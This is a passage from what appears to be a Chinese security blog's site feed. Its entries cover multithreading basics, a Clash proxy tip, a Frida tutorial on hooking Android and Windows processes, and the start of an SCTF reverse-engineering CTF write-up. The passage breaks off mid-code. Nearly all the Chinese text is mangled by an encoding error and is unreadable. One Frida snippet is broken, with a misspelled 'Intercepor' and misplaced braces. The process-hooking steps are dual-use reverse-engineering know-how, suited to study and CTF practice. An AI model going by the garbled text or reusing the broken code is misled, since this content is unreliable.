        <tags>
            
            <tag> RE </tag>
            
            <tag> so </tag>
            
            <tag> SM4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤šçº¿ç¨‹åŸºæœ¬çŸ¥è¯†</title>
      <link href="/posts/db8fb698.html"/>
      <url>/posts/db8fb698.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¨‹åºï¼Œè¿›ç¨‹ï¼Œçº¿ç¨‹">ç¨‹åºï¼Œè¿›ç¨‹ï¼Œçº¿ç¨‹</h2><p>ç¨‹åºæ˜¯æœ‰è‡ªå·±å†…å­˜å¸ƒå±€çš„ä¸€ç§æ¨¡å—ã€‚å†…å­˜å¸ƒå±€ä¸€éƒ¨åˆ†ç”±å·²ç»å®ç°å¥½çš„ç¡®å®šçš„æ•°æ®å’ŒåŠ¨æ€æ‰§è¡Œæ—¶çš„åŒºåŸŸä¸¤éƒ¨åˆ†ã€‚</p><p><img src="https://s2.loli.net/2024/10/28/qPehVxkaOfTtvNj.png" alt="image-20241028143850519"></p><p>ç¨‹åºæ˜¯è¿›ç¨‹çš„ç»„ä»¶ã€‚è¿›ç¨‹éœ€è¦é€šè¿‡ç»„ä»¶æ¥å®Œæˆå¯¹åº”çš„åŠŸèƒ½ã€‚å¦‚æœè¿™ä¸ªç¨‹åºä¸ä¾èµ–å…¶å®ƒç¨‹åºå³å¯å®Œæˆå…¶æ—¢å®šçš„åŠŸèƒ½ï¼Œå®ƒçš„å†…å­˜å¸ƒå±€ä¹Ÿå°±æ˜¯è¿›ç¨‹çš„å†…å­˜å¸ƒå±€ã€‚å¦‚è‹¥ä¸æ˜¯ï¼Œé‚£ä¹ˆä¸Šå›¾ä¸­çš„å¸ƒå±€ï¼ˆä»£ç åŒºå’Œé™æ€æ•°æ®åŒºï¼‰ä¼šæœ‰å¤šä»½ã€‚</p><p>è¿›ç¨‹å°±æ˜¯è®¡ç®—æœºæ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ã€‚å®ƒæœ‰è‡ªå·±çš„æŒ‡ä»¤æµå’Œå†…å­˜ç©ºé—´ä»¥åŠä¸€é¢—è™šæ‹ŸCPUã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ä¸€ä¸ªè¿›ç¨‹åªæœ‰ä¸€ä¸ªæ§åˆ¶æµï¼Œä½†æ˜¯åœ¨ç°ä»£æ“ä½œç³»ç»Ÿç»“æ„ä¸­ï¼Œè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªæ§åˆ¶æµã€‚æ¯ä¸ªæ§åˆ¶æµæœ‰ä¸€ä¸ªå•ç‹¬çš„è°ƒç”¨æ ˆã€‚è¿™å°±æ˜¯çº¿ç¨‹ã€‚çº¿ç¨‹éš¶å±äºä¸€ä¸ªè¿›ç¨‹ï¼Œå¯ä»¥è®¿é—®è¿™ä¸ªè¿›ç¨‹ä¸­ç»å¤§éƒ¨åˆ†èµ„æºã€‚Windowsä¸‹ï¼Œæ‰€æœ‰ä»»åŠ¡è¿è¡Œçš„å•ä½å°±æ˜¯çº¿ç¨‹ã€‚</p><h2 id="å‡ ä¸ªæ¨¡å‹">å‡ ä¸ªæ¨¡å‹</h2><h3 id="å¤šè¿›ç¨‹æ¨¡å‹">å¤šè¿›ç¨‹æ¨¡å‹</h3><p>æ—¶åˆ†ä¼ªå¹¶è¡Œï¼šå¯¹äºè¿›ç¨‹æ¥è¯´ï¼ŒæŠŠCPUæ—¶é—´åˆ‡ç‰‡ï¼Œåœ¨å¯¹åº”çš„æ—¶é—´æ‰§è¡Œå¯¹åº”çš„è¿›ç¨‹ï¼Œç”±äºæ—¶é—´å¾ˆçŸ­ï¼Œå°±ä¼šæœ‰å¹¶è¡Œçš„æ•ˆæœã€‚æ¯ä¸ªè¿›ç¨‹è¿˜æœ‰ä¸€ä¸ªç‹¬ç«‹ç©ºé—´å’Œæ˜ å°„çš„è™šæ‹ŸCPUï¼Œæ¯æ¬¡åˆ‡æ¢æ—¶éƒ½ä¼šé€šè¿‡æŸäº›ç¡¬ä»¶æœºåˆ¶æˆ–è½¯ä»¶æœºåˆ¶åˆ‡æ¢æ§åˆ¶æƒï¼ŒåŒæ—¶ä¿å­˜å¥½åˆ‡æ¢çš„è¿›ç¨‹çš„ç¯å¢ƒä¿¡æ¯ã€‚å› æ­¤å¯¹äºè¿›ç¨‹è€Œè¨€ï¼Œå®ƒä»¬æ˜¯è¿ç»­æ‰§è¡Œçš„ã€‚</p><h3 id="çº¿ç¨‹æ¨¡å‹">çº¿ç¨‹æ¨¡å‹</h3><p>åˆ†ä¸ºç”¨æˆ·çº§çº¿ç¨‹å’Œå†…æ ¸çº§çº¿ç¨‹</p><p>ç”¨æˆ·çº§çº¿ç¨‹ä¸ºåº”ç”¨ç¨‹åºåœ¨æŸäº›æ§åˆ¶ç‚¹ä¸Šåˆ†ç¦»è™šæ‹Ÿæ§åˆ¶æµä»¥æ¨¡æ‹Ÿå¤šä¸ªæ§åˆ¶æµè¡Œä¸ºã€‚çº¿ç¨‹åˆ‡æ¢æ•ˆç‡ï¼ˆè¾ƒå†…æ ¸çº§çº¿ç¨‹ï¼‰é«˜ï¼Œå¯ä»¥è‡ªå®šä¹‰åˆ‡æ¢ç®—æ³•ï¼Œä½†æ§åˆ¶åŠ›å¼±</p><p>å†…æ ¸çº§çº¿ç¨‹æŒ‡æ“ä½œç³»ç»Ÿæä¾›çº¿ç¨‹èƒ½åŠ›ï¼Œå¯ä»¥ç›´æ¥æ§åˆ¶çº¿ç¨‹çš„å·¥ä½œã€‚ç³»ç»Ÿç»´æŠ¤ä¸€å¼ å…¨å±€çº¿ç¨‹è¡¨ï¼Œè®°å½•çº¿ç¨‹çš„å„ç§ä¿¡æ¯ã€‚åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼ˆå¦‚ï¼šsleepï¼Œwaitï¼Œselectç­‰å‡½æ•°æˆ–ç¡¬ä¸­æ–­å’Œå¼‚å¸¸ï¼‰æ‰§è¡Œå¯¹åº”çš„çº¿ç¨‹è°ƒåº¦ã€‚ä»è€Œåº”ç”¨è¿›ç¨‹ä¸éœ€è¦è€ƒè™‘åˆ‡æ¢è¿›ç¨‹ï¼Œä¹Ÿä¸éœ€è¦æ‹…å¿ƒè‡ªå·±ä¼šå ç”¨è¿‡å¤šCPUæ—¶é—´ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿä¼šåè°ƒ</p><h2 id="å¹¶å‘ç¼–ç¨‹">å¹¶å‘ç¼–ç¨‹</h2><p>ä¸‰ç§æ„é€ å¹¶å‘ç¨‹åºçš„æ–¹å¼ï¼š</p><ul><li>åŸºäºè¿›ç¨‹ï¼šå†…æ ¸å®ç°çš„å¤šè¿›ç¨‹é€šä¿¡</li><li>åŸºäºIOå¤šè·¯å¤ç”¨ï¼šé€»è¾‘æµè¢«æŠ½è±¡åŒ–ä¸ºçŠ¶æ€æœºï¼Œä¸»åŠ¨ç›‘æµ‹æ–‡ä»¶æè¿°ç¬¦</li><li>åŸºäºçº¿ç¨‹ï¼šå†…æ ¸è°ƒåº¦ï¼Œå…±äº«è™šæ‹Ÿåœ°å€</li></ul><p>IOå¤šè·¯å¤ç”¨ï¼š<a href="https://www.cnblogs.com/yrxing/p/14143644.html">ä¸€æ–‡ææ‡‚I/Oå¤šè·¯å¤ç”¨åŠå…¶æŠ€æœ¯ - å°¹ç‘æ˜Ÿ - åšå®¢å›­</a></p><p>å¦å¤–2ä¸ªï¼šã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹</p><h2 id="çº¿ç¨‹è°ƒåº¦">çº¿ç¨‹è°ƒåº¦</h2><p>å¦‚æœä¸€ä¸ªè¿›ç¨‹æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œé‚£ä¹ˆå¦‚ä½•åˆ¤æ–­ä»€ä¹ˆæ—¶å€™è¯¥æ‰§è¡Œå“ªä¸ªçº¿ç¨‹å‘¢ã€‚Windowsä¸­çº¿ç¨‹è°ƒåº¦ä¾èµ–äº<code>å¼‚å¸¸</code>çš„è§¦å‘ã€‚(å†™è¿™ç¯‡çš„æ—¶å€™è¿˜æ²¡å­¦ä¸­æ–­å’Œå¼‚å¸¸ï¼Œå…·ä½“å†…å®¹å…ˆç•™ç€)ï¼Œå¼‚å¸¸æ‹¥æœ‰ç­‰çº§ï¼Œé«˜ç­‰çº§çš„å¼‚å¸¸å¯ä»¥æ‰“æ–­ä½ç­‰çº§çš„å¼‚å¸¸çš„å¤„ç†ï¼Œç­‰çº§è¢«ç§°ä¸ºIRQLï¼Œå¯¹äºIRQLç­‰äº1çš„çº¿ç¨‹ï¼Œè¡¨ç¤ºæ­£åœ¨æ’å…¥å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨ï¼ˆAPCï¼‰å¯¹è±¡ï¼Œè‹¥IRQLç­‰äº2ï¼Œè¡¨ç¤ºæ­£åœ¨æ‰§è¡Œçº¿ç¨‹è°ƒåº¦(é€‰æ‹©æ–°çº¿ç¨‹ï¼Œå¤„ç†ç¡¬ä»¶ä¸­æ–­ä¸­ä¸ç´§æ€¥çš„éƒ¨åˆ†)ï¼Œè¢«ç§°ä¸ºå»¶è¿Ÿè¿‡ç¨‹è°ƒç”¨ï¼ˆDPCï¼‰ã€‚é€šè¿‡è¿™ä¸¤ç§å¼‚å¸¸ï¼Œå¯ä»¥å¯¹çº¿ç¨‹è¿›è¡Œè°ƒåº¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clash-bugä¿®å¤</title>
      <link href="/posts/6e34e55a.html"/>
      <url>/posts/6e34e55a.html</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘ä¹Ÿå¼€å§‹ä½¿ç”¨clashäº†ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½æ˜¯ç”¨çš„ç³»ç»Ÿä»£ç†ï¼Œå¯¼è‡´ä¸€äº›ç½‘ç«™æ€»æ˜¯å‡ºå¥‡æ€ªçš„bugã€‚<br>ç„¶åå¼€å§‹æƒ³å¯ä¸å¯ä»¥åƒburpsuitä¸€æ ·ä»æµè§ˆå™¨ç›‘å¬ç«¯å£ï¼Œç„¶åæˆåŠŸäº†ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">localhost</span>:<span class="number">7890</span></span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è®¾ç½®å¥½åå³å¯é˜²æ­¢å…¨å±€ä»£ç†ç›´æ¥åœ¨æµè§ˆå™¨ä½¿ç”¨clashä»£ç†</p>]]></content>
      
      
      <categories>
          
          <category> å®è·µ </category>
          
          <category> è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> clash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida-åŸºæœ¬ä½¿ç”¨æ–¹æ³•</title>
      <link href="/posts/d2ac55a9.html"/>
      <url>/posts/d2ac55a9.html</url>
      
        <content type="html"><![CDATA[<h1>Frida</h1><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17294561.html">Frida åŸç†åŠç®€å•ä½¿ç”¨ - Only-xiaoxiao - åšå®¢å›­ (cnblogs.com)</a></p><p>æ‰¾çš„ä¸€ç¯‡ä½¬çš„åšå®¢</p><h2 id="Android">Android</h2><h3 id="åŸºæœ¬ç¯å¢ƒåˆ›å»º">åŸºæœ¬ç¯å¢ƒåˆ›å»º</h3><p>å¯¹äºå®‰å“æ¨¡æ‹Ÿå™¨ï¼š</p><p>é¦–å…ˆéœ€è¦æ‰‹æœºç«¯æœ‰frida serverï¼Œå¦‚æœæ˜¯æ¨¡æ‹Ÿå™¨éœ€è¦x86å’Œx64çš„ç‰ˆæœ¬ï¼Œå¦‚æœæ˜¯çœŸæœºï¼Œéœ€è¦arm86å’Œarm64ã€‚ç„¶åæœ¬æœºéœ€è¦fridaã€‚</p><h3 id="æ¨¡æ‹Ÿå™¨">æ¨¡æ‹Ÿå™¨</h3><h4 id="å»ºç«‹è¿æ¥">å»ºç«‹è¿æ¥</h4><p>åœ¨ç”µè„‘ç«¯ä½¿ç”¨adb shellè¿æ¥è‡³æ‰‹æœºç«¯ï¼Œåœ¨shellä¸­å¯åŠ¨frida_serverï¼Œå¯åŠ¨å‚æ•°ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-x -l 0.0.0.0:xxxx</span><br></pre></td></tr></table></figure><p>å¯åŠ¨serveræ—¶ï¼Œ-læŒ‡å®šipå’Œç«¯å£å·ï¼Œï¼Œç”¨äºåˆ›å»ºå’Œç”µè„‘ç«¯çš„è¿æ¥</p><p>ç”µè„‘ç«¯ä½¿ç”¨adb</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:xxxx tcp:xxxx</span><br></pre></td></tr></table></figure><p>å’Œæ‰‹æœºç«¯å»ºç«‹é€šä¿¡å®Œæˆï¼Œç°åœ¨frida-serveræ­£åœ¨ç­‰å¾…ç”µè„‘çš„fridaè¿æ¥</p><h4 id="é™„åŠ è¿›ç¨‹">é™„åŠ è¿›ç¨‹</h4><p>ä¸è¿‡fridaé™„åŠ çš„æ˜¯è¿›ç¨‹ï¼Œæ‰€ä»¥å…ˆä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -H 127.0.0.1:xxxx</span><br></pre></td></tr></table></figure><p>-Hè¡¨ç¤ºfridaæŒ‡å®šä½¿ç”¨ç«¯å£å·è¿æ¥ç›®æ ‡ï¼Œç”¨psæ¥æŸ¥çœ‹ç›®æ ‡çš„è¿›ç¨‹åï¼Œ</p><p>å¾—åˆ°è¿›ç¨‹åyyyåï¼Œä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -H 127.0.0.1:xxxx yyy -l hook.js</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åŒæ ·çš„æ–¹æ³•é™„åŠ ç›®æ ‡çš„yyyè¿›ç¨‹ï¼Œå¹¶ç›´æ¥é™„åŠ è„šæœ¬hook.jsï¼Œè¿™é‡Œçš„è„šæœ¬éœ€è¦æŒ‡å®šå…¨éƒ¨è·¯å¾„</p><p>è¿æ¥ä¸Šä¹‹ååº”è¯¥ä¼šå‡ºç°fridaæç¤ºä¿¡æ¯å’Œå­—ç¬¦ç”»</p><p>ä¹‹åå‡ºç°çš„å‘½ä»¤è¡Œå¯ä»¥å†™å…¥ä»»æ„frida-jsæŒ‡ä»¤</p><h3 id="çœŸæœº">çœŸæœº</h3><p>å»ºç«‹è¿æ¥ï¼Œç”±äºæ‰‹æœºæ˜¯é€šè¿‡usbè¿æ¥çš„ï¼Œæ‰€ä»¥å…ˆåœ¨æ‰‹æœºç«¯å¯åŠ¨serverã€‚<br>ç„¶å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>UæŒ‡usbè°ƒè¯•</p><p>å–å¾—è¿›ç¨‹åã€‚</p><p>ç„¶åä½¿ç”¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U apk_name -l hook.js</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨hook.jsé™„åŠ åˆ°apk_nameè¿›ç¨‹</p><h3 id="ä½¿ç”¨è„šæœ¬">ä½¿ç”¨è„šæœ¬</h3><p>nativeå±‚çš„Hookï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;<span class="comment">//Java.performå‡½æ•°ä¼šæŠŠåé¢ä¼ å…¥çš„å‡½æ•°åœ¨Javaç¯å¢ƒä¸­æ‰§è¡Œï¼Œè¿™é‡Œä½¿ç”¨åŒ¿åå‡½æ•°æ¯”è¾ƒæ–¹ä¾¿ï¼Œé‡Œé¢å†™hookå‡½æ•°ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªhookå‡½æ•°å¯ä»¥ç›´æ¥ä¼ hookå‡½æ•°</span></span><br><span class="line">        <span class="title function_">hook</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);<span class="comment">//æ ¹æ®GPTï¼Œè¯¥å‡½æ•°æŠŠä¼ å…¥çš„å‡½æ•°æ³¨å†Œåˆ°æœ¬è½®æ¶ˆæ¯é˜Ÿåˆ—æœ«å°¾ï¼ŒIOæ“ä½œå®Œæˆæ—¶è§¦å‘çš„å‡½æ•°ä¹‹åï¼Œä¸ä¼šé˜»å¡IOæ“ä½œåŒæ—¶ä¹Ÿä¼šå°½å¯èƒ½å¿«é€Ÿåœ°æ‰§è¡Œè¿™ä¸ªå‡½æ•°</span></span><br></pre></td></tr></table></figure><p>åœ¨hookä¸­å†™è‡ªå·±çš„ä»£ç æ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> xtea = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;example.encrypt.xtea&quot;</span>);<span class="comment">//åŠ è½½å¯¹åº”ç±»</span></span><br><span class="line">    xtea[<span class="string">&quot;encrypt&quot;</span>].<span class="property">implementation</span> = </span><br><span class="line">    <span class="keyword">function</span> (<span class="params">iArr, iArr2</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`xtea.encrypt is called: iArr=<span class="subst">$&#123;iArr&#125;</span>, iArr2=<span class="subst">$&#123;iArr2&#125;</span>`</span>);</span><br><span class="line">    <span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xtea[<span class="string">&quot;encrypt&quot;</span>]å¯ä»¥é€šè¿‡[]å–å¯¹åº”çš„æ–¹æ³•ï¼Œç„¶åä½¿ç”¨implementationæ¥é‡å†™æ–¹æ³•ï¼Œåé¢è·Ÿä¸€ä¸ªç›¸åŒä¼ å‚çš„åŒ¿åå‡½æ•°ï¼Œæ³¨æ„ä¸€å®šè¦åœ¨è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨<span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);æ¥è°ƒç”¨åŸå‡½æ•°ï¼Œå¦‚æœè¿™ä¸ªå‡½æ•°æœ‰è¿”å›å€¼å¯ä»¥ä»¤<span class="keyword">let</span> retV = <span class="variable language_">this</span>[<span class="string">&quot;encrypt&quot;</span>](iArr, iArr2);å†<span class="variable language_">console</span>.<span class="property">log</span>å‡ºæ¥</span><br></pre></td></tr></table></figure><h2 id="Windows">Windows</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> number = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> base = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;xxx.exe&quot;</span>)<span class="comment">//é€šè¿‡exeæ¥å¯»æ‰¾åŸºå€</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;inject success&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (base)&#123;</span><br><span class="line">        <span class="title class_">Intercepor</span>.<span class="title function_">attach</span>(base.<span class="title function_">add</span>(<span class="number">0xFFF</span>),&#123;<span class="comment">//è¿™é‡Œçš„æ•°å€¼æ˜¯ç›®æ ‡æŒ‡ä»¤åœ°å€ç›¸å¯¹äºbaseçš„åç§»é‡</span></span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;<span class="comment">//è¿›å…¥æ—¶æ‰§è¡Œ</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args)</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;<span class="comment">//ç¦»å¼€æ—¶æ‰§è¡Œ</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(retval)</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯æ’æŒ‡ä»¤çš„æ¡©</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">functionsToHook.<span class="title function_">forEach</span>(<span class="function"><span class="params">functionName</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">Module</span>.<span class="title function_">getExportByName</span>(<span class="string">&quot;xxx.dll&quot;</span>, functionName), &#123;<span class="comment">//é€šè¿‡å¯¼å‡ºè¡¨ç›´æ¥æ’å‡½æ•°</span></span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            xxx</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">           xxx</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ’å‡½æ•°çš„æ¡©</p><hr><p>æœªå®Œç»“</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> å·¥å…· </category>
          
          <category> æ’æ¡©åŠhook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ’æ¡© </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF_RE_å¤ç°</title>
      <link href="/posts/359c2434.html"/>
      <url>/posts/359c2434.html</url>
      
        <content type="html"><![CDATA[<p>æ­»ç£•äº†é‚£ä¹ˆä¹…ï¼Œè¿˜æ˜¯æ²¡æå‡ºæ¥QAQï¼Œå¤ªèœäº†ï¼Œè¿˜æ˜¯ï¼Œä¸è¿‡è¿™ä¸ªWPç»™æˆ‘äº†äº›åšè¿™ç§è¯­è¨€ç±»é¢˜ç›®çš„æƒ³æ³•ã€‚æŒ‰WPçš„æ–¹æ³•å¤ç°äº†ä¸€ä¸‹ï¼Œç¡®å®å¯ä»¥ç›´æ¥å‡º</p><h2 id="ez-cython">ez_cython</h2><p>å¯¹äºè¿™ç±»é¢˜ç›®ï¼Œä»¥å¾€æˆ‘åªä¼šhookä¸€ä¸‹ä¼ å…¥å‚æ•°å’Œè¿”å›å€¼ã€‚ä½†æ˜¯è¿™ä¸ªWPé€šè¿‡æ„é€ è‡ªå·±çš„ç±»ä½¿å…¶è¿”å›äº†ç¬¦å·å€¼ä»è€Œç›´æ¥æ‰“å°æµç¨‹ï¼Œååˆ†NBï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Symbol</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__add__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> + <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> + <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__radd__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__add__(other)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__xor__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, Symbol):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> ^ <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> ^ <span class="subst">&#123;<span class="built_in">hex</span>(other)&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rxor__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__xor__(other)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, other</span>):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &lt;&lt; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, other</span>):</span><br><span class="line">            <span class="keyword">return</span> Symbol(<span class="string">f&quot;(<span class="subst">&#123;self&#125;</span> &gt;&gt; <span class="subst">&#123;other&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__and__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(other, 